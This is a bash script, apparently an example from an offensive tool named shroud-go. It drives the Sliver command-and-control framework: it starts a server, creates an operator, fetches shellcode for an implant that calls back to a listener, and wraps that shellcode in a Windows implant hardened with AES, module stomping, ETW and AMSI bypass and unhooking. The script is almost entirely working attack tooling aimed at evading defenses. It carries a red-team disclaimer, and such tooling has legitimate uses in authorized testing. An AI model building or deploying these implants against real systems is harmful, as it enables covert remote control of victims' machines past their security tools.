#!/usr/bin/env bash
# examples/sliver-test.sh — end-to-end Sliver C2 test for shroud-go.
#
# Stand up a local Sliver server, create an operator, import the config, then
# use shroud to fetch a shellcode implant from Sliver and (optionally) build a
# hardened shroud payload around it.
#
# Run on a Kali box with sliver-server + sliver-client installed (here at
# /usr/bin/). The shroud binary is expected at ~/shroud-go/shroud.
#
# AUTHORIZED RED-TEAM USE ONLY — only test against systems you own/control.
set -euo pipefail

SHROUD=${SHROUD:-~/shroud-go/shroud}
SLIVER_SERVER=${SLIVER_SERVER:-/usr/bin/sliver-server}
SLIVER_CLIENT=${SLIVER_CLIENT:-/usr/bin/sliver-client}

LHOST=${LHOST:-127.0.0.1}
LPORT=${LPORT:-8888}        # implant MTLS callback port
OPPORT=${OPPORT:-31337}    # operator (multiplayer) port
OPNAME=${OPNAME:-kali}
WORK=$(mktemp -d /tmp/shroud-sliver-XXXX)
CFG="$WORK/${OPNAME}_${LHOST}.cfg"   # sliver names it <name>_<lhost>.cfg

echo "[*] work dir: $WORK"
echo "[*] shroud:   $SHROUD  (build first: cd ~/shroud-go && go build -o shroud ./cmd/shroud)"

# 1. Authorize shroud (one-time).
"$SHROUD" authorize --yes >/dev/null 2>&1 || true

# 2. Start sliver-server in the background (first run initializes a database).
echo "[*] starting sliver-server (first start compiles deps, ~60s)..."
"$SLIVER_SERVER" >"$WORK/server.log" 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null || true' EXIT
sleep 5

# 3. Generate an operator config with builder permissions (so it can `generate`).
echo "[*] creating operator '$OPNAME'..."
"$SLIVER_SERVER" operator --name "$OPNAME" --lhost "$LHOST" --lport "$OPPORT" \
    --permissions builder --save "$WORK" || {
    echo "[!] operator generation failed (server may need `multiplayer` enabled in its console)"
    cat "$WORK/server.log"; exit 1
}

# 4. Import the operator config into the client.
echo "[*] importing $CFG ..."
"$SLIVER_CLIENT" import "$CFG"

# 5. Preflight via shroud.
echo "[*] shroud sliver preflight ..."
"$SHROUD" sliver preflight --sliver-config "$CFG" --lhost "$LHOST" --lport "$LPORT"

# 6. Fetch a shellcode implant from Sliver (standalone, writes .bin).
echo "[*] shroud sliver fetch (generates shellcode via server) ..."
"$SHROUD" sliver fetch --sliver-config "$CFG" --lhost "$LHOST" --lport "$LPORT" \
    --name shroud-test -o "$WORK/sliver.bin"
echo "[+] shellcode: $(wc -c <"$WORK/sliver.bin") bytes -> $WORK/sliver.bin"

# 7. (Optional) full hardened path: shroud wraps the sliver blob in pe26.
echo "[*] shroud generate pe26 --c2 sliver (AES + full stack) ..."
"$SHROUD" generate pe26 --c2 sliver --sliver-config "$CFG" \
    --lhost "$LHOST" --lport "$LPORT" \
    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd \
    -o "$WORK/pe26" || echo "[!] generate failed (see above)"

echo
echo "[done] artifacts in $WORK"
echo "       - sliver.bin : raw sliver shellcode"
echo "       - pe26/      : hardened shroud implant (implant.exe)"
echo "       server log: $WORK/server.log"
echo "Stop the sliver server with: kill $SRV"